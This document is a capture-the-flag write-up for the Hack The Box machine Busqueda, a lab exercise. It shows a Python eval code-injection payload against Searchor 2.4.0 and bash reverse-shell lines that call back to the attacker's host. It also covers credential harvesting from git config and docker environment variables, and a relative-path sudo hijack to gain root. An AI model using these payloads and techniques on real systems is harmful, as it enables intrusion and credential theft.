# Hack The Box Busqueda Writeup


![busqueda title card](images/busqueda/busqueda.png)

Busqueda is an easy difficulty machine available from Hack The Box. While playing the machine, we encounter concepts including docker containers, Unix paths, dangerous python functions, and git. 

# Enumeration

Let's begin gathering information about the machine. 

## Nmap

We start off with an `nmap` scan. 

```bash
nmap -sC -sV TARGET-IP
```

After `nmap` runs for a bit, we get the following output:

```
Nmap scan report for TARGET-IP
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```

Looking at the output, we can see the following ports are open:

- SSH on port 22
- HTTP on port 80

We can also see that `nmap` did not follow the redirect to `http://searcher.htb`, so let's add that to our hosts file. 

```bash
sudo -- sh -c "echo TARGET-IP searcher.htb >> /etc/hosts"
```

## Website

Now that we've added the `searcher.htb` domain, let's go and check out the website running on port 80. 

![searcher website](images/busqueda/busqueda-website.PNG)

The site presents itself as a search engine that combines the power of other search engines such as Google and DuckDuckGo. We can select which engine we would like to use, and then provide some terms to search for. 

Just looking at the main page of the site, take note of the footer. It's telling us that this particular web application is powered by `Flask`, as well as `Searchor 2.4.0`. 

`Flask` is a reasonably common occurence among Hack The Box machines, but `Searchor` is not so common. A quick google of `Searchor` reveals that it is a python library that is used to perform web scraping, giving the web app it's searching powers. If we Google for the particular *version* that the web application is using (`2.4.0`), we find some interesting results. 

Version `2.4.0` of `Searchor` has an arbitrary code execution bug in it due to the unsafe use of the `eval` function. 

## Eval == Evil

The python `eval` function is a function that "*evaluates*" a specified expression. If the expression is valid python code, it will execute it. Consider the examples presented below (executed in the python shell):

```python
>>> eval("1+1")
2
>>> eval("print(f'hello{1+1}')")
hello2
```

If we can get our own python code to be executed by the `eval` function, we can gain a foothold on the system. 

The [Searchor Github respository](https://github.com/ArjunSharda/Searchor) will show us where the bug is. Where bugs are concerned, the `Issues` page is the first place to start. Since we already know what we're looking for, we can just search for `eval`. 

![searchor eval issue](images/busqueda/busqueda-pr.PNG)

There we have it, one of the project collaborators created an issue to fix the dangerous use of `eval`. If we open up the issue and go to the `Commits` tab, we can view the diff to see what was changed. 

![searchor diff](images/busqueda/busqueda-diff.PNG)

Here we can see the structure of the code *before* the fix was merged into the project. The `search` function uses `eval` to craft the URL as a format string. Notice that the `query` parameter is being inserted into `eval` without any kind of sanitization. This is likely going to be our entry point. 

## Searcher Application

Now that we know the library that the app is using has an unsafe `eval` flaw in it, let's see how the *Searcher website* works. If we open up Burp Suite and route our web traffic through its proxy, we can observe and mess with the requests that are sent. 

![search request](images/busqueda/busqueda-search.PNG)

It looks to be a simple POST request, with the chosen search engine and query being sent as the payload. To play around with the request, hit `CTRL+R` to send it to the Burp Repeater. 

## Manual Exploitation

There are plenty of pre-written scripts that will exploit the `Searchor` arbitrary code execution bug for you, but being able to exploit something manually is still an important skill to have. This is especially true for new vulnerabilities that appear which may not have any proof-of-concept code available. 

Since we know that the web app is using `eval` in a dangerous way, we can try to inject our own python code into it. 

To start out, let's see what happens if we make a request similar to the one above, but then add in a `'` at the end of our query, like so:

![single quote request](images/busqueda/busqueda-request.png)

The reason we're using a `'` character is because the `searchor` source code uses double quotes (`"`) to enclose the format string, so we need to use single quotes to avoid interfering with that. The parameters in the format string are also enclosed in single quotes. 

After forwarding this request on to the web server, we can see that we get a blank page back. From this response, we can infer that our modified request must have caused some error in the backend, which resulted in the server sending an empty page back to us. When our query gets inserted into the `eval` function in the `searchor` source code, it would look like this:

```python
url = eval(f"Engine.{engine}.search('test'', copy_url={copy}, open_web={open})")
```

The extra `'` we added would result in an odd number of quotes, causing an error, and giving us that blank page. 

Now that we know that a single `'` will cause an error, let's see if we can prematurely terminate the format string that is being used inside the `eval` function. If we can do that, then we know that we can manipulate the string, and leverage that ability to inject our own python code into it. 

To do so, we need to close the call to the `search` function inside the format string, and then comment out the rest of the string. We can do this with the following request:

![close search function request](images/busqueda/busqueda-close-search-request.png)

The `test` text has been removed since we don't really need it. Here's what each of the characters in the above request is doing:

- `'` - closing off the arguments being provided to the `search` function
- `)` - closing off the call to the `search` function
- `#` - commenting out the rest of the code

When the query from our request is passed into the `eval` function, it will look like this:

```python
url = eval(f"Engine.{engine}.search('')#, copy_url={copy}, open_web={open})")
```

Everything after the `#` is going to be ignored, effectively turning the code into the following:

```python
url = eval(f"Engine.{engine}.search('')")
```

When we send this request, the server responds with a non-blank page. This indicates that we've been able to mess with the code successfully without causing any errors in the backend!

Now that we know we can manipulate the format string, we can try to inject our own python code into it. 

We're going to inject a call to the `exec` python function. `exec` accepts a string of python code as input and will execute it (assuming there are no syntax errors in the input). To get a reverse shell on the box, we'll create a bash reverse shell on our local machine, and then use the injected `exec` function to retrieve the shell, update its permissions, and execute it. 

Our request payload will take the following form:

```python
engine=Accuweather&query='), exec("__import__('os').system('CMD HERE')")#
```

Here's a breakdown of the different components in our request:

- `__import__('os')` - import the `os` python module to enable interaction with the operating system
- `system()` - execute any provided command in a subshell

# Foothold

A great resource for reverse shells is [revshells.com](https://www.revshells.com). All we need to do is insert our attacking machine's IP, the port we'll receive our shell on, and choose the type of shell we'd like. For this machine, we'll use `Bash -i`. 

![revshells](images/busqueda/revshells.png)

We're going to copy the generated shell and paste it into a file named `shell.sh`. 

Now that our shell is ready to go, we need to start a local webserver in the same directory as our shell file so that the box can retrieve it. 

```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can use our injected `exec` function to get a shell on the box. First we need to retrieve the shell from our attacking machine (ensure you replace `YOUR-IP` with your attacking machine's IP):

![get shell request](images/busqueda/busqueda-get-shell.png)

Next, we change the permissions of the shell file to make it executable:

![make shell executable](images/busqueda/busqueda-permissions.png)

Next, we start a listener on the same port as we defined in our shell file. In this case, we used port `4444`:

```
nc -lvnp 4444
listening on [any] 4444 ...
```

Finally, we execute our shell file:

![execute shell](images/busqueda/busqueda-execute-shell.png)

We should now receive a reverse shell on our listener as the `svc` user:

```
connect to [YOUR-IP] from (UNKNOWN) [TARGET-IP] 58514
bash: cannot set terminal process group (1663): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ 
```


## User Flag

We have a shell! Go and grab the user flag from `svc`'s home directory. 

# Privilege Escalation

If we list all files in the home directory of `svc`, we can see there is a `.gitconfig` file. 

```
svc@busqueda:~$ ls -la
total 36
drwxr-x--- 4 svc  svc  4096 Dec 28 01:31 .
drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
lrwxrwxrwx 1 root root    9 Feb 20  2023 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28  2023 .cache
-rw-rw-r-- 1 svc  svc   109 Dec 28 01:31 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3  2023 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20  2023 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Dec 27 10:45 user.txt
```

This tells us that `git` is being used on this box. It's likely that the developers of the `searcher` app used `git` while developering their vulnerable web application. 

If we take a look at the `.gitconfig` file, we find a couple of interesting pieces of information. 

```
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
[safe]
        directory = /var/www/app
```

We can see that the user using `git` is named `cody`, and the repository is in the directory `/var/www/app`. Let's go to the repository directory and see if `git` tells us anything interesting. 

```
svc@busqueda:/$ cd /var/www/app
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Dec 27 10:45 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

The presence of a `.git` file shows that `git` is definitely being used here. We can run `git log` to see a log of the commits that were made. 

```
svc@busqueda:/var/www/app$ git log
commit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4
Author: administrator <administrator@gitea.searcher.htb>
Date:   Sun Dec 25 12:14:21 2022 +0000

    Initial commit
svc@busqueda:/var/www/app$ 
```

Here we can see that there is a new domain mentioned, `gitea.searcher.htb`. We'll add that to our `/etc/hosts` file for later use. 

We can also see from the output that there is a user with the name `administrator`. Make a note of this as well as it will be useful later. 

We should also check the `git config` to see if there is any sensitive information present. 

```
svc@busqueda:/var/www/app$ git config -l
user.email=cody@searcher.htb
user.name=cody
core.hookspath=no-hooks
safe.directory=/var/www/app
core.repositoryformatversion=0
core.filemode=true
core.bare=false
core.logallrefupdates=true
remote.origin.url=http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
remote.origin.fetch=+refs/heads/*:refs/remotes/origin/*
branch.main.remote=origin
branch.main.merge=refs/heads/main
svc@busqueda:/var/www/app$ 
```

Take a look at the `remote.origin.url`, it contains a password! This is likely what the `cody` user is using to log into the git repository at `gitea.searcher.htb`. Let's go to that site and try to log in as `cody`. 

## Gitea

Navigating to `http://gitea.searcher.htb` brings us to the homepage of Gitea, a software package for self-hosting Git, along with other features such as bug tracking, wikis, etc. Let's click the `Sign In` button and try to log in as `cody`, using the password that we found. 

![gitea log in](images/busqueda/busqueda-gitea-login.png)

We're in!

We can see that the repository contains the source code of the `searcher` web application, and we can see that `cody` and `administrator` are contributors. We can also see how the backend functions of the vulnerable web app are implemented, including the call to the `search` function that we exploited earlier.

```python
engine = request.form.get('engine')
query = request.form.get('query')
auto_redirect = request.form.get('auto_redirect')

if engine in Engine.__members__.keys():
    arg_list = ['searchor', 'search', engine, query]
    r = subprocess.run(arg_list, capture_output=True)
```

Let's keep looking around. 

## Sudo

`sudo` can be another method of privilege escalation. We don't know the password of the `svc` user, and `cody` isn't a registered user on the box. However, it could be possible that the password for `cody` has been reused. Let's give it a try:

```
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:/var/www/app$ 
```

Would you look at that, the password has indeed been reused. Bad for security, but good for us. 

The output from `sudo` tells us that we can run a python script named `system-checkup.py` with `root` privileges. Let's give it a try.

## Docker Container Enumeration

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ 
```

Now we're given some options relating to `docker`, so we should assume that there must be some docker containers running on the box. If you're not familiar with `docker`, it is highly recommended that you go and do some learning about it. You can start with [this youtube video](https://www.youtube.com/watch?v=Gjnup-PuquQ). 

Let's run the checkup script with the first option, `docker-ps`, to see the containers that are running on the box. 

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS         PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   11 months ago   Up 2 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   11 months ago   Up 2 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ 
```

The output tells us that there are two containers running, with one container running `gitea`, and the other running `mysql`. 

Now let's run the script with the second option, `docker-inspect`, to see if we can get some more detailed information about the running containers. 

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:~$ 
```

We're being told that we need to supply two parameters: `format`, and `container_name`. We already know the names of the containers, but we're not given any clues as to what `format` could be. 

Some googling around `docker inspect format` brings us to the Docker documentation for the `docker inspect` command. It tells us that we need to specify what format the output should take. There's also a link to some format templates included. We're going to use `JSON`, as it is a nice readable format. From the [documentation](https://docs.docker.com/config/formatting/#json), we can see that we need to wrap our chosen format with double curly braces and single quotes. 

Though now you might be wondering what we're even looking for with `docker-inspect`. The first place I like to check would be the environment variables of the container. Sensitive information can sometimes be stored here, so it's worth checking. To get the environment variables, our format is going to be the following:

```
'{{json .Config.Env}}'
```

Now we just pass this to the `system-checkup` script:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config.Env}}' gitea
```

Finally, we get back the environment variables of the `gitea` container. 

```json
[
    "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "USER=git",
    "GITEA_CUSTOM=/data/gitea"
]
```

Another password. It would be a fair assumption to assume that this password belongs to the `administrator` user. We know that they are a user of the `Gitea` repository that we found earlier, so let's see if we can sign into their account. 

![administrator gitea login](images/busqueda/busqueda-administrator-login.png)

Just like that, we're in... again. This time, we can see *another* repository: `administrator/scripts`. In here, we can find the source code of the scripts that the `svc` user can run as `root`. 

## Relative Paths

The `full-checkup` option is the only one that we haven't run yet. If we review the section of the `system-checkup.py` script that performs the full checkup, we find the following code:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

The python script is running a separate bash script to perform the checkup. This particular code block is vulnerable to exploitation because of it's use of a `relative path` to call the `full-checkup.sh` script. 

A `path` is the unique location of a resource in the file system. An `absolute path` is a type of `path` that always begins from the file system root, leaving no room for any kind of misinterpretation. A `relative path` is a type of `path` that is defined with reference to the *current working directory*. 

```bash
/home/example/files/my-file.sh # absolute path
./files/my-file.sh # relative path (assuming the current directory is /home/example)
```

Creating our own `full-checkup.sh` script, and then running the `system-checkup.py` script *outside* of `/opt/scripts` will mean that *our* script will be executed. This happens because our script will have the same name as the one referenced in the source code above, and the script is being called *relative to our current working directory*. 

## Root Flag

To get our root flag, we're going to get another reverse shell, this time as `root`. To do this, we need to:

1. Create our own `full-checkup.sh` script in a directory we have access to (such as our home directory) and paste in a reverse shell command:

```
svc@busqueda:~$ nano full-checkup.sh

#!/bin/bash
bash -i >& /dev/tcp/YOUR-IP/YOUR-PORT 0>&1
```

2. Make the script executable:

```
svc@busqueda:~$ chmod +x full-checkup.sh
```

3. Start a listener on our attacking machine to listen for the incoming shell

```
svc@busqueda:~$ nc -lvnp 4444
listening on [any] 4444 ...
```

4. Run the `system-checkup.py` script with the `full-checkup` option:

```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

We should now receive a root shell on our waiting listener.

```
root@busqueda:/home/svc# whoami
root
root@busqueda:/home/svc# 
```

Now we can go and grab the root flag. 

Congratulations, you just pwned Busqueda!

# References

- [Searchor Project](https://github.com/ArjunSharda/Searchor)
- [Docker Documentation - Inspect](https://docs.docker.com/engine/reference/commandline/inspect/)
- [Docker Documentation - Formats](https://docs.docker.com/config/formatting/)
- [Stack Overflow - Get Docker Environment Variables](https://stackoverflow.com/questions/30342796/how-to-get-env-variable-when-doing-docker-inspect)
- [Geeks for Geeks - Pathnames in UNIX](https://www.geeksforgeeks.org/absolute-relative-pathnames-unix/)

# Tools Used

- [Burp Suite](https://portswigger.net/burp/communitydownload)
- [Snyk Vulnerability Database - searchor@2.4.0](https://security.snyk.io/package/pip/searchor/2.4.0)
- [Revshells.com](https://www.revshells.com)
